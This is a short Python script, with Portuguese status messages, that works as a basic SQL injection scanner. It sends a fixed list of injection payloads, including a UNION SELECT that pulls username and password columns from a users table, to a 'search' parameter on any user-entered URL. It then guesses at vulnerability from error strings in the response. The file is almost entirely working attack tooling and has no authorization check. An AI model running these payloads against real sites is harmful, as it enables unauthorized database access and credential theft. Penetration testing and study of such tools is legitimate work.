import requests
from time import sleep

print("""
                      [@] choose your SQL vulnerability test:
                      [1] payload test
                      [2] EXIT
""")

choice = input("input =>>  ")
url = input("Input URL: ") # Target URL
payloads = ["' OR 1=1 --", "' UNION SELECT NULL --", "' AND '1'='1' --", "' AND 1=CONVERT(int, 'a') --", "' UNION SELECT null, username, password FROM users --"]

def payload_test(url, payloads):
    if url[:7] != "http://":
        url = "http://"+url

    try:
        for payload in payloads:
            params = {'search': payload}
            response = requests.get(url, params=params)

            print(f"\033[34m[INFO] Testando payload: {payload}\033[97m")
            print(f"Status da requisição: {response.status_code}")
            
            if "error" in response.text.lower():
                print("\033[91m[INFO] Possível vulnerabilidade de SQL Injection detectada. \033[97m \n")
            elif "unexpected" in response.text.lower():
                print("\033[0m[INFO] O site pode estar vulnerável a SQL Injection. \033[97m \n")
            else:
                print("\033[32m[INFO] Nenhuma vulnerabilidade detectada. \033[97m \n")

    except requests.exceptions.RequestException as e:
        print(f"\033[91m[ERRO] Falha na requisição: {e}\033[97m \n")
        sleep(2)

    except KeyboardInterrupt:
        print("\nExiting ..!!!")
        sleep(2)

try:
    if choice =='1':
        payload_test(url,payloads)

    elif choice =='2': # EXIT
        print("\nExiting ..!!!")
        sleep(2)
    
    else:
        print("try again ...")
        sleep(1)

except KeyboardInterrupt:
    print("\nExiting ..!!!")
    sleep(2)
